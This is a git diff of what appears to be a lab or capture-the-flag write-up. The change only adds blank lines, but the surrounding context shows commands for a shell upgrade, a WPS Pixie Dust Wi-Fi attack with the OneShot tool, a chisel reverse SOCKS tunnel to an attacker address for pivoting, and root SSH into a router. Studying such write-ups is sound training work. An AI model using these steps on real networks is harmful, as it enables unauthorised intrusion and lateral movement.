@@ -131,6 +131,7 @@ void updateCustomOut()
 ![image12](../resources/59b8a1a22a5d461498c1d59c89fe828a.png)
 
 - More stable shell:
+
 ```bash
 /usr/bin/script -qc /bin/bash /dev/null
 
@@ -174,6 +175,7 @@ iwconfig
 - First we need to find the passphrase for the network
 
 - We can see if we can do a WPS Pixie Dust Attack:
+  
 ```bash
 git clone https://github.com/kimocoder/OneShot/tree/master
 
@@ -202,6 +204,7 @@ sudo python3 oneshot.py -i wlan0 -K
 ![image19](../resources/fccbd04dc09e4ce39f140565c16ce115.png)
 
 - Uploaded chisel to see if I can see any other machines on the network and got a hit on 192.168.1.1 on port 80:
+  
 ```bash
 chisel server -p 8888 --reverse
 ./chisel client 10.10.14.50:8888 R:socks
@@ -229,6 +232,7 @@ Port 22 is also open on the router:
 We successfully log in
 
 - We can use this to ssh to the access point:
+  
 ```bash
 ssh root@192.168.1.1
 ```
